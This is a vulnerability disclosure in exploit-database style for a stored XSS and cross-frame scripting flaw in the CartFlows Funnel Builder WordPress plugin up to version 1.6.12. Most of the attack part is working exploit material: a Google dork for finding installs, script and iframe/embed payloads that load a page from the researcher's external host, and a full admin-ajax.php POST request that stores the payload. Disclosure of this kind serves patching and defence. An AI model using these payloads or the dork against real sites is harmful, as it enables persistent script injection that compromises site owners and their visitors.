/*!
- # VULNERABILITY: Funnel Builder by CartFlows WordPress Plugin <= 1.6.12 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/cartflows/
- # DATE: 2021-04-27
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: CartFlows Inc [ https://cartflows.com ]
- # SOFTWARE VERSION: <= 1.6.12
- # SOFTWARE LINK: https://wordpress.org/plugins/cartflows/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the Funnel Builder by CartFlows plugin through v1.6.12 for WordPress.

[i] Vulnerable parameter(s): $options['wcf-custom-script'] (cartflows/modules/optin/classes/class-cartflows-optin-meta-data.php:515).



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] <script>console.log('Injection..');</script><iframe src=https://m0ze.ru/payload/xfsii.html></iframe><script>console.log('Done!');</script>

[$] <script>console.log('Injection..');</script><embed src=https://m0ze.ru/payload/xfsii.html></embed><script>console.log('Done!');</script>



### -- [ PoC | Authenticated Persistent XSS | Flows > Custom Script: ]

[!] POST /wp-admin/admin-ajax.php?_locale=user HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=---------------------------42758701251850322822328840003
Content-Length: 1216

-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="thankyou-shortcode"

https://blackcore.ru?class=wcf-next-step
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="post_title"

Landing
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="post_name"

landing
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="wcf-custom-script"

<script>console.log('Injection..');</script><iframe src=https://m0ze.ru/payload/xfsii.html></iframe><script>console.log('Done!');</script>
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="action"

cartflows_save_meta_settings
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="security"

a4e58be982
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="post_id"

83
-----------------------------42758701251850322822328840003
Content-Disposition: form-data; name="step_id"

84
-----------------------------42758701251850322822328840003--



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
